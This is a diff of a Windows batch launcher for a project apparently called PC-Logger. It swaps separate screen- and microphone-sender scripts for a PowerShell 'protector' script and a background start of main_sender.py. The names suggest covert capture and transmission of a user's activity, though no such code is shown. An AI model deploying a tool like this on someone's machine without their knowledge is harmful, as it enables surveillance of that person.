@@ -1,8 +1,7 @@
 IF EXIST ".venv" (
-    python "\src\main_sender.py"
-    timeout /t  3 /nobreak
-    python "\src\screen_sender.py"
-    python "\src\mic_sender.py"
+    call .venv\Scripts\activate
+    call cmd /k "C:\Users\sieve\OneDrive\Desktop\Coding\Projects\PC-Logger\src\protector.ps1"
+    start /B cmd /k "C:\Users\sieve\OneDrive\Desktop\Coding\Projects\PC-Logger\.venv\Scripts\python.exe C:\Users\sieve\OneDrive\Desktop\Coding\Projects\PC-Logger\src\main_sender.py"
 ) ELSE (
     python -m venv .venv
     call .venv\Scripts\activate
